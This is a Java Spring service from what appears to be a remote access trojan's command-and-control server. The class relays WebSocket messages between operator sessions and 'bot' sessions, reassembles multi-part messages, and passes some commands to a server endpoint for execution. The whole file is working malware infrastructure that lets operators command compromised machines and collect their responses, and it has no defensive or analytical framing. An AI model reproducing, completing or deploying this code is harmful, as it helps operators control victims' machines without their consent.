package devs.alex.sah.rat.c2server.services.impl;

import devs.alex.sah.rat.c2server.configuration.MessagesConfiguration;
import devs.alex.sah.rat.c2server.models.AssociativePair;
import devs.alex.sah.rat.c2server.services.MessagesBuilder;
import devs.alex.sah.rat.c2server.services.ServerEndpoint;
import lombok.extern.slf4j.Slf4j;
import devs.alex.sah.rat.c2server.models.Message;
import devs.alex.sah.rat.c2server.services.MessagesCoordinator;
import devs.alex.sah.rat.c2server.services.WebSocketSessionService;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.BinaryMessage;
import org.springframework.web.socket.PongMessage;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.io.IOException;
import java.util.UUID;

@Slf4j
@Service
public class MessagesCoordinatorImpl implements MessagesCoordinator {

    private final String CONTINUATION = "CE-"; // CE - continuation envelope
    private final String LAST_PART = "LE-";    // LE - last envelope

    private final WebSocketSessionService botWSSessionService;
    private final WebSocketSessionService userWSSessionService;
    private final ServerEndpoint serverEndpoint;
    private final MessagesBuilder messagesBuilder;
    private final MessagesConfiguration mConfig;

    public MessagesCoordinatorImpl(@Qualifier("botWebSocketSessionService") WebSocketSessionService botWSSessionService,
                                   @Qualifier("userWebSocketSessionService") WebSocketSessionService userWSSessionService,
                                   ServerEndpoint serverEndpoint, MessagesBuilder messagesBuilder, MessagesConfiguration messagesConfiguration) {
        this.botWSSessionService = botWSSessionService;
        this.userWSSessionService = userWSSessionService;
        this.serverEndpoint = serverEndpoint;
        this.messagesBuilder = messagesBuilder;
        this.mConfig = messagesConfiguration;
    }

    private String handleUserFirstPackage(Message<?> message, WebSocketSession session, String id, StringBuffer errors) {

        if (message.getTargetType().equals(mConfig.targets.botSide)) {
            if (session.getAttributes().put(CONTINUATION + message.getRequestID(),
                    messagesBuilder.generateUser2BotEnvelope(message.getTargetModule(),id, mConfig.packages.continuation)) != null) {
                errors.append("Key [").append(CONTINUATION).append(message.getRequestID()).append("] exists\n");
            }
            if (session.getAttributes().put(LAST_PART + message.getRequestID(),
                    messagesBuilder.generateUser2BotEnvelope(message.getTargetModule(), id, mConfig.packages.lastPart)) != null) {
                errors.append("Key [").append(LAST_PART).append(message.getRequestID()).append("] exists\n");
            }
            return messagesBuilder.generateUser2BotFirstEnvelope(message.getTargetModule(), id, message.getResponseType(), message.getFullMessageSize());

        } else {
            if (session.getAttributes().put(CONTINUATION + message.getRequestID(),
                    messagesBuilder.generateUser2UserEnvelope(id, message.getTargetModule(), mConfig.packages.continuation)) != null) {
                errors.append("Key [").append(CONTINUATION).append(message.getRequestID()).append("] exists\n");
            }
            if (session.getAttributes().put(LAST_PART + message.getRequestID(),
                    messagesBuilder.generateUser2UserEnvelope(id, message.getTargetModule(), mConfig.packages.lastPart)) != null) {
                errors.append("Key [").append(LAST_PART).append(message.getRequestID()).append("] exists\n");
            }
            return messagesBuilder.generateUser2UserFirstEnvelope(message.getRequestID(), message.getTargetModule(), message.getResponseType(), message.getFullMessageSize());
        }
    }

    private String handleBotFirstPackage(Message<?> message, WebSocketSession session, String originalRequest, StringBuffer errors) {

        if (message.getTargetType().equals(mConfig.targets.botSide)) {
            if (session.getAttributes().put(CONTINUATION + message.getRequestID(),
                    messagesBuilder.generateBot2UserEnvelope(message.getTargetID(), message.getTargetModule(), originalRequest, mConfig.packages.continuation)) != null) {
                errors.append("Key [").append(CONTINUATION).append(message.getRequestID()).append("] exists\n");
            }
            if (session.getAttributes().put(LAST_PART + message.getRequestID(),
                    messagesBuilder.generateBot2UserEnvelope(message.getTargetID(), message.getTargetModule(), originalRequest, mConfig.packages.lastPart)) != null) {
                errors.append("Key [").append(LAST_PART).append(message.getRequestID()).append("] exists\n");
            }
            return messagesBuilder.generateBot2UserFirstEnvelope(message.getTargetID(), message.getTargetModule(),
                    originalRequest, message.getFullMessageSize(), message.getIsLast());
        } else {
            errors.append("Undefined Target");
            return "";
        }
    }

    private String handleUserSingleMessage(Message<?> message, String request) {
        if (message.getTargetType().equals(mConfig.targets.botSide)) { // where to send
            return messagesBuilder.generateUser2BotSingleEnvelope(message.getTargetModule(), request, message.getResponseType());
        } else {
            return messagesBuilder.generateUser2UserSingleEnvelope(request, message.getTargetModule(), message.getResponseType());
        }
    }

    private WebSocketSession findTarget(Message<?> message, String recipientType, String recipientID, String sender, StringBuffer errors) {
        WebSocketSession result = null;
        if (recipientType.equals(mConfig.targets.botSide)) {
            if (sender.equals(mConfig.targets.controlSide)) {
                messagesBuilder.validateEnvelope(message, errors, MessagesBuilder.ValidationType.control2botInbox);
                result = botWSSessionService.getSession(recipientID);
            } else {
                errors.append("Forbidden Action");
            }
        } else if (recipientType.equals(mConfig.targets.controlSide)) {
            if (sender.equals(mConfig.targets.controlSide)) {
                messagesBuilder.validateEnvelope(message, errors, MessagesBuilder.ValidationType.control2controlInbox);
                result = userWSSessionService.getSession(recipientID);
            } else if (sender.equals(mConfig.targets.botSide)) {
                messagesBuilder.validateEnvelope(message, errors, MessagesBuilder.ValidationType.bot2controlInbox);
                result = userWSSessionService.getSession(recipientID);
            } else {
                errors.append("Forbidden Action");
            }
        } else {
            errors.append("Undefined target [").append(recipientType).append("];\n");
        }
        if (result == null) {
            errors.append("Unable to find session [").append(recipientID).append("] at ").append(recipientType).append(";\n");
        }
        return result;
    }

    private void handleUserErrors(WebSocketSession session, StringBuffer errors) {
        sendTextMessage(session, messagesBuilder.generateErrorEnvelope(mConfig.targets.controlSide), errors.toString());
    }

    private AssociativePair extractAssociativePair(WebSocketSession session, String associativeRequest, StringBuffer errors) {
        try {
            Object result = session.getAttributes().get(associativeRequest);
            if (result instanceof AssociativePair) {
                if (((AssociativePair) result).getSenderSession() == null || ((AssociativePair) result).getSenderSession().isEmpty() ||
                    ((AssociativePair) result).getRequestID() == null || ((AssociativePair) result).getRequestID().isEmpty() ||
                    ((AssociativePair) result).getTargetModule() == null || ((AssociativePair) result).getTargetModule().isEmpty()) {
                    errors.append("Failed to read associative pair");
                }
                return (AssociativePair) result;
            }
        } catch (NullPointerException nullPointerException) {
            errors.append("Failed to extract associative pair");
        }
        return new AssociativePair();
    }


    @Override
    public ServerEndpoint getServerEndpoint() {
        return serverEndpoint;
    }

    @Override
    public void handleBotTextMessage(WebSocketSession session, TextMessage toParse) {
        StringBuffer errors = new StringBuffer();
        Message<String> message = messagesBuilder.parseMessage(toParse, errors);
        if (errors.length() != 0) {
            log.error(errors.toString());
            return;
        }

        AssociativePair association = extractAssociativePair(session, message.getRequestID(), errors);
        if (errors.length() != 0) {
            log.error(errors.toString());
            return;
        }
        message.setTargetModule(association.getTargetModule());
        if(association.getSenderSession().equals("sErvEr")){
            serverEndpoint.executeCommand(ServerEndpoint.Sender.BOT, session, message);
            return;
        }
        WebSocketSession target = findTarget(message, mConfig.targets.controlSide, association.getSenderSession(), mConfig.targets.botSide, errors);
        if (errors.length() != 0) {
            log.error(errors.toString());
            return;
        }
        String envelope;
        if (message.getPackageType().equals(mConfig.packages.continuation)) {
            envelope = (String) target.getAttributes().get(CONTINUATION + message.getRequestID());

        } else if (message.getPackageType().equals(mConfig.packages.lastPart)) {
            envelope = (String) target.getAttributes().get(LAST_PART + message.getRequestID());
            target.getAttributes().remove(CONTINUATION + message.getRequestID());
            target.getAttributes().remove(LAST_PART + message.getRequestID());

        } else if (message.getPackageType().equals(mConfig.packages.firstPart)) {
            message.setTargetID(session.getId());
            envelope = handleBotFirstPackage(message, target, association.getRequestID(), errors);
        } else if (message.getPackageType().equals(mConfig.packages.singleMessage)) {
            envelope = messagesBuilder.generateBot2UserSingleEnvelope(
                    session.getId(), message.getTargetModule(), association.getRequestID(), message.getIsLast());
        } else {
            log.error(errors.append(" Undefined package type [").append(message.getPackageType()).append("];\n").toString());
            return;
        }
        if (errors.length() != 0) {
            log.error(errors.toString());
            return;
        }
        sendTextMessage(target, envelope, message.payload());
    }

    @Override
    public void handleBotBinaryMessage(WebSocketSession session, BinaryMessage message) {

    }

    @Override
    public void handleUserTextMessage(WebSocketSession session, TextMessage toParse) {
        StringBuffer errors = new StringBuffer();
        Message<String> message = messagesBuilder.parseMessage(toParse, errors);
        if (message.getTargetType() == null) {
            errors.append("[Target] cannot be null\n");
        }
        if (errors.length() != 0) {
            handleUserErrors(session, errors);
            return;
        }
        if (message.getTargetType().equals(mConfig.targets.serverSide)) {
            serverEndpoint.executeCommand(ServerEndpoint.Sender.BOT, session,message);
        } else {

            WebSocketSession target = findTarget(message, message.getTargetType(), message.getTargetID(), mConfig.targets.controlSide, errors);
            if (errors.length() != 0) {
                handleUserErrors(session, errors);
                return;
            }
            String association = message.getTargetType().equals(mConfig.targets.controlSide)
                    ? (String) session.getAttributes().get("userId")  // No association
                    : UUID.randomUUID().toString(); // new random string
            String envelope;

            if (message.getPackageType().equals(mConfig.packages.continuation)) {
                envelope = (String) target.getAttributes().get(CONTINUATION + message.getRequestID());

            } else if (message.getPackageType().equals(mConfig.packages.lastPart)) {
                envelope = (String) target.getAttributes().get(LAST_PART + message.getRequestID());
                target.getAttributes().remove(CONTINUATION + message.getRequestID());
                target.getAttributes().remove(LAST_PART + message.getRequestID());

            } else if (message.getPackageType().equals(mConfig.packages.firstPart)) {
                envelope = handleUserFirstPackage(message, target, association, errors);
            } else if (message.getPackageType().equals(mConfig.packages.singleMessage)) {
                envelope = handleUserSingleMessage(message, association);
            } else {
                handleUserErrors(session, errors.append(" Undefined package type [").append(message.getPackageType()).append("];\n"));
                return;
            }
            if (errors.length() != 0) {
                handleUserErrors(session, errors);
                return;
            }
            if (!(message.getResponseType() == null || (message.getResponseType() != null && message.getResponseType().equals("none")))) {
                target.getAttributes().put(association, new AssociativePair((String) session.getAttributes().get("userId"), message.getRequestID(), message.getTargetModule()));
            }
            sendTextMessage(target, envelope, message.payload());
        }
    }

    @Override
    public void handleUserBinaryMessage(WebSocketSession session, BinaryMessage message) {

    }

    @Override
    public void sendTextMessage(WebSocketSession recipientSession, String envelope, String payload) {
        try {
            recipientSession.sendMessage(new TextMessage(envelope + payload));
        } catch (IOException e) {
            log.error("Fault send message. Message envelope: {}. Error: {}", envelope, e.getMessage());
        }
    }

    @Override
    public void sendBinaryMessage(WebSocketSession session, BinaryMessage message) {

    }

    @Override
    public void handlePongMessage(WebSocketSession session, PongMessage message) {

    }
}
